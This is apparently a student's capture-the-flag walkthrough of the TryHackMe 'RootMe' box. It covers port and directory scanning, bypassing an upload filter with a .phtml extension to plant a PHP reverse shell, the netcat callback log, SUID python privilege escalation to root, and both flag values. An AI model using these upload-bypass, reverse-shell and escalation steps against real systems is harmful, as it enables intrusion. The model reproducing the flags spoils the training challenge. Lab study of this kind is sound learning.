---
description: Notes taken while trying to hack the "RootMe" box on TryHack Me
---

# THM RootMe Box

General Information:

IP Provided: 10.10.73.223



Make sure you can reach the box with ping

```
ping 10.10.73.223
```



### <mark style="color:red;">Question 1 - How many ports are open?</mark>

Scan the machine using nmap

```
nmap -sN 10.10.73.223
```

Port 22 (SSH) is open

Port 80 (http) is open



### <mark style="color:red;">Question 2 - What version of Apache is running?</mark>

Scan the machine using nmap with the -sV option to reveal services

{% code overflow="wrap" %}
```
nmap -sN -sV 10.10.73.223

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-28 16:09 EDT
Nmap scan report for 10.10.73.223
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.63 seconds

```
{% endcode %}

Apache version 2.4.29 is running

### <mark style="color:red;">Question 3 - What service is running on port 22?</mark>

SSH

### <mark style="color:red;">Question 4 - Find directories on the web server using the GoBuster tool</mark>

{% code overflow="wrap" %}
```
gobuster dir -e -u http://10.10.73.223/ -w /usr/share/wordlists/dirb/common.txt


===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.73.223/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2022/10/28 16:27:26 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.73.223/.hta                 (Status: 403) [Size: 277]
http://10.10.73.223/.htpasswd            (Status: 403) [Size: 277]
http://10.10.73.223/.htaccess            (Status: 403) [Size: 277]
http://10.10.73.223/css                  (Status: 301) [Size: 310] [--> http://10.10.73.223/css/]
http://10.10.73.223/index.php            (Status: 200) [Size: 616]
http://10.10.73.223/js                   (Status: 301) [Size: 309] [--> http://10.10.73.223/js/]
http://10.10.73.223/panel                (Status: 301) [Size: 312] [--> http://10.10.73.223/panel/]
http://10.10.73.223/server-status        (Status: 403) [Size: 277]
http://10.10.73.223/uploads              (Status: 301) [Size: 314] [--> http://10.10.73.223/uploads/]
Progress: 4578 / 4615 (99.20%)===============================================================
2022/10/28 16:28:17 Finished
===============================================================

```
{% endcode %}



### <mark style="color:red;">Questions 5 - What is the hidden directory?</mark>

/panel/

(Not sure why this is the only correct answer, it appears as though there are multiple directories)



### <mark style="color:red;">Question 6 - Find a form to upload and get a reverse shell, and find the flag. (user.txt)</mark>



Try to reach the webpage at the IP through http.

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption><p>Here is the webpage</p></figcaption></figure>

Try navigating to the hidden directory /panel/. You'll see that there is an interface to upload a file. We need to figure out how to use this.

The webpage has file name filtering that does not allow files to be uploaded with the .php extension. We need to find a way around this.&#x20;

It seems that the file can have plain text which will be displayed to the screen, but any php script output does not seem to appear. The php files can be uploaded, but not with the php extension

Example payloads:

```
This is a test
```

```
<?PHP print exec('hostname'); ?>
```

Attempts to make the php script look like a .gif or .jpg were unsuccessful.

Research shows that netcat might be the way to get the reverse shell here (I think I'm getting ahead of the classes I'm taking. This seems pretty standard, and I just didn't know about it)

It has also been recommended to use a reverse shell script like the one found here:

```
https://github.com/pentestmonkey/php-reverse-shell
```

Start a netcat listener on a port

```
nc -lvnp 9001  

```

Using the .phtml extension, I was able to upload the script and gain a reverse shell. The script was configured to expect me my kali box to be listening on port 9001. I configured the IP in the script to my kali box IP.

```
└─# nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.6.3.180] from (UNKNOWN) [10.10.73.223] 55712
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 21:46:29 up  2:06,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Lets look for the user.txt file that is identified in the question&#x20;

```
find / | grep user.txt

/var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

### <mark style="color:red;">Question 7 -Search for files with SUID permission, which file is weird?</mark>

After some research, I found that you can run the following command to see all files with the SUID permissions. This also sends all errors (like permission denied warnings) to /dev/null so you dont have to sift through them

```
find / -perm /4000 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount


```

Not really sure how you're supposed to know this other than guessing and checking, but the answer is:&#x20;

/usr/bin/python

Since this is obviously supposed to draw your attention to fact that python commands will be run with the permissions of the files owner. Does this mean I make a python script owned by root and execute it as the www-data user?

### <mark style="color:red;">Find a form to escalate your privileges.</mark>

Googling was needed here as well. I managed to find a site called [`https://gtfobins.github.io/`](https://gtfobins.github.io/)

It has a section related to python that contains multiple types of attacks and things that can be done with the python binary. One script in particular was of interest considering we know that the pythong binary has SUID permissions.

{% code overflow="wrap" %}
```
sudo install -m =xs $(which python) .

./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
{% endcode %}

Per the section description on the site:

`To interact with an existing SUID binary skip the first command and run the program using its original path.`

Using the second command (script) listed grants a root shell

You need to delete the ./ in front of python for the command to work.

The command is running a one liner python script that executes a console command to generate a shell with the permissions of the python binary. In this box that is root, so you get a root shell.

{% code overflow="wrap" %}
```
bash-4.4$ ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
bash: ./python: Is a directory
bash-4.4$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'      
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
whoami
root
# cd /root
# cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}


```
{% endcode %}







